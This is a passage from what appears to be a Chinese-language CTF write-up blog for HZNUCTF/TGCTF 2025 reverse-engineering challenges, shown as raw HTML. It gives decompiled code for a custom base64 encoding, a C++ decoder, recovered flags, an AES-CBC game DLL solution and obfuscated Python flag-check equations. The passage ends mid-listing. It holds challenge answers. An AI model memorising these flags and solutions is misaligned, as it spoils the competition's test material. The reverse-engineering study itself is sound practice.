class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v31;</span><br><span class="line">    v6 = v31;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v6;</span><br><span class="line">  v8 = v6 + <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(v8);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v2 - v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = a1 + <span class="number">2</span>;</span><br><span class="line">    v11 = ((<span class="type">int</span>)v2 - v5 - <span class="number">1LL</span>) / <span class="number">3uLL</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 += <span class="number">4</span>;</span><br><span class="line">      v12 = *(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      v10 += <span class="number">3</span>;</span><br><span class="line">      v13 = v12 + <span class="number">24</span>;</span><br><span class="line">      v14 = v13 - <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v14 = v13;</span><br><span class="line">      v9[v3 - <span class="number">4</span>] = v30[v14];</span><br><span class="line">      v15 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3</span>))) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3u</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v15 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3</span>))) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">3</span>] = v30[v15];</span><br><span class="line">      v16 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xF</span>))) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xFu</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v16 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xF</span>))) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">2</span>] = v30[v16];</span><br><span class="line">      v17 = (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3F</span>) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3Fu</span>) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v17 = (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3F</span>) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">1</span>] = v30[v17];</span><br><span class="line">      --v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 );</span><br><span class="line">  &#125;</span><br><span class="line">  v18 = v5 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span> &lt;= <span class="number">0x40u</span> )</span><br><span class="line">      v25 = (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span>;</span><br><span class="line">    v9[v7 - <span class="number">4</span>] = v30[v25];</span><br><span class="line">    v26 = *(_BYTE *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    *(_WORD *)&amp;v9[v7 - <span class="number">2</span>] = <span class="number">15677</span>;</span><br><span class="line">    v27 = <span class="number">16</span> * v26 + <span class="number">24</span>;</span><br><span class="line">    v28 = v27 - <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt;= <span class="number">0x40</span> )</span><br><span class="line">      v28 = v27;</span><br><span class="line">    v9[v7 - <span class="number">3</span>] = v30[v28];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v18 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_37:</span><br><span class="line">    v9[v7] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v9;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = a1 + (<span class="type">int</span>)v2;</span><br><span class="line">  v20 = (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span> &lt;= <span class="number">0x40u</span> )</span><br><span class="line">    v20 = (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span>;</span><br><span class="line">  v9[v7 - <span class="number">4</span>] = v30[v20];</span><br><span class="line">  v21 = ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3</span>))) - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3u</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">    v21 = ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3</span>))) + <span class="number">24</span>;</span><br><span class="line">  v9[v7 - <span class="number">3</span>] = v30[v21];</span><br><span class="line">  v22 = *(_BYTE *)(v19 - <span class="number">1</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  *(_WORD *)&amp;v9[v7 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  v23 = <span class="number">4</span> * v22 + <span class="number">24</span>;</span><br><span class="line">  v24 = <span class="number">4</span> * v22 - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v23 &lt;= <span class="number">0x40</span> )</span><br><span class="line">    v24 = v23;</span><br><span class="line">  v9[v7 - <span class="number">2</span>] = v30[v24];</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_input_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *base64_table = <span class="string">&quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> reverse_table[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        reverse_table[(<span class="type">unsigned</span> <span class="type">char</span>)base64_table[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> input_len = <span class="built_in">strlen</span>(_input_);</span><br><span class="line">    <span class="type">size_t</span> padding = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_len &gt; <span class="number">0</span> &amp;&amp; _input_[input_len - <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        padding++;</span><br><span class="line">        <span class="keyword">if</span> (input_len &gt; <span class="number">1</span> &amp;&amp; _input_[input_len - <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            padding++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> output_len = (input_len * <span class="number">3</span>) / <span class="number">4</span> - padding;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *output = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(output_len + <span class="number">1</span>);</span><br><span class="line">    output[output_len] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; input_len - padding)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b1, b2, b3, b4;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v1 = reverse_table[_input_[i++]];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v2 = reverse_table[_input_[i++]];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v3 = (i &lt; input_len) ? reverse_table[_input_[i++]] : <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v4 = (i &lt; input_len) ? reverse_table[_input_[i++]] : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        b1 = (v1 &gt; <span class="number">24</span>) ? (v1 - <span class="number">24</span>) : (v1 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b2 = (v2 &gt; <span class="number">24</span>) ? (v2 - <span class="number">24</span>) : (v2 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b3 = (v3 &gt; <span class="number">24</span>) ? (v3 - <span class="number">24</span>) : (v3 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b4 = (v4 &gt; <span class="number">24</span>) ? (v4 - <span class="number">24</span>) : (v4 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b1 &lt;&lt; <span class="number">2</span>) | (b2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b2 &lt;&lt; <span class="number">4</span>) | (b3 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b3 &lt;&lt; <span class="number">6</span>) | b4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *Enc= <span class="string">&quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *Decoded= <span class="built_in">base64_decode</span>(Enc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, Decoded);</span><br><span class="line">    <span class="built_in">free</span>(decoded);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</p><h2 id="æ°´æœå¿è€…"><a href="#æ°´æœå¿è€…" class="headerlink" title="æ°´æœå¿è€…"></a>æ°´æœå¿è€…</h2><p>ä¸»è¦ dll ç›®å½•ï¼š\æ°´æœå¿è€…\Fruit Ninja_Data\Managed\Assembly-CSharp.dll</p><p>æ‹–å…¥ dnSpy åˆ†æï¼Œæ˜¯ AES CBC åŠ å¯†ã€‚</p><p><img src="/2025/04/13/TGCTF2025/SkHubyVDToXzQ5x3DFBcF7PQntf.png"></p><p>åº•ä¸‹æœ‰å¯†æ–‡ã€å¯†é’¥ã€ivï¼Œç›´æ¥è§£å¯†å³å¯ã€‚</p><p><img src="/2025/04/13/TGCTF2025/E150bPmfNoFuhzxZfGqcRtBunkd.png"></p><p><img src="/2025/04/13/TGCTF2025/IOlAbPLIwomQLFxru43cw9Ubn0e.png"></p><p>HZNUCTF{de20-70dd-4e62-b8d0-06e}</p><h2 id="è›‡å¹´çš„æœ¬å‘½è¯­è¨€"><a href="#è›‡å¹´çš„æœ¬å‘½è¯­è¨€" class="headerlink" title="è›‡å¹´çš„æœ¬å‘½è¯­è¨€"></a>è›‡å¹´çš„æœ¬å‘½è¯­è¨€</h2><p>python ç¨‹åºè§£åŒ…å¾—åˆ° pycï¼ˆpython 3.8ï¼‰ï¼Œä½¿ç”¨ uncompyle6 è§£å¯†å¾—åˆ°ä»£ç ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from collections <span class="keyword">import</span> Counter</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;Welcome to HZNUCTF!!!&quot;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;Plz input the flag:&quot;</span>)</span></span></span><br><span class="line"><span class="function">ooo0oOoooOOO0 </span>= <span class="built_in">input</span>()</span><br><span class="line">oOO0OoOoo000 = <span class="built_in">Counter</span>(ooo0oOoooOOO0)</span><br><span class="line">O0o00 = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>((<span class="built_in">str</span>(oOO0OoOoo000[oOooo0OOO]) <span class="keyword">for</span> oOooo0OOO in ooo0oOoooOOO0))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ans1: &quot;</span>, _end_=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(O0o00)</span><br><span class="line"><span class="keyword">if</span> O0o00 != <span class="string">&quot;111111116257645365477364777645752361&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong_wrong!!!&quot;</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>)</span><br><span class="line">iiIII = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> oOooo0OOO in ooo0oOoooOOO0:</span><br><span class="line">    <span class="keyword">if</span> oOO0OoOoo000[oOooo0OOO] &gt; <span class="number">0</span>:</span><br><span class="line">        iiIII += oOooo0OOO + <span class="built_in">str</span>(oOO0OoOoo000[oOooo0OOO])</span><br><span class="line">        oOO0OoOoo000[oOooo0OOO] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i11i1Iii1I1 = [<span class="built_in">ord</span>(oOooo0OOO) <span class="keyword">for</span> oOooo0OOO in iiIII]</span><br><span class="line">        ii1iIi1i11i = [</span><br><span class="line">         <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] == <span class="number">504</span>,</span><br><span class="line">         <span class="number">9</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] == <span class="number">403</span>,</span><br><span class="line">         <span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] == <span class="number">799</span>,</span><br><span class="line">         <span class="number">3</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">3</span>] == <span class="number">2938</span>,</span><br><span class="line">         <span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">19</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">4</span>] == <span class="number">2042</span>,</span><br><span class="line">         <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">5</span> * i11i1Iii1I1[<span class="number">5</span>] == <span class="number">1225</span>,</span><br><span class="line">         <span class="number">11</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">77</span> * i11i1Iii1I1[<span class="number">6</span>] == <span class="number">7975</span>,</span><br><span class="line">         <span class="number">21</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">7</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">7</span>] == <span class="number">229</span>,</span><br><span class="line">         <span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">8</span>] == <span class="number">2107</span>,</span><br><span class="line">         <span class="number">10</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">30</span> * i11i1Iii1I1[<span class="number">9</span>] == <span class="number">4037</span>,</span><br><span class="line">         <span class="number">15</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">59</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">56</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">122</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] == <span class="number">4950</span>,</span><br><span class="line">         <span class="number">13</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">42</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">62</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] == <span class="number">12544</span>,</span><br><span class="line">         <span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">63</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">25</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] == <span class="number">6585</span>,</span><br><span class="line">         <span class="number">223</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">53</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">13</span>] == <span class="number">6893</span>,</span><br><span class="line">         <span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">68</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">14</span> * i11i1Iii1I1[<span class="number">14</span>] == <span class="number">1883</span>,</span><br><span class="line">         <span class="number">69</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">77</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">9</span>] + <span 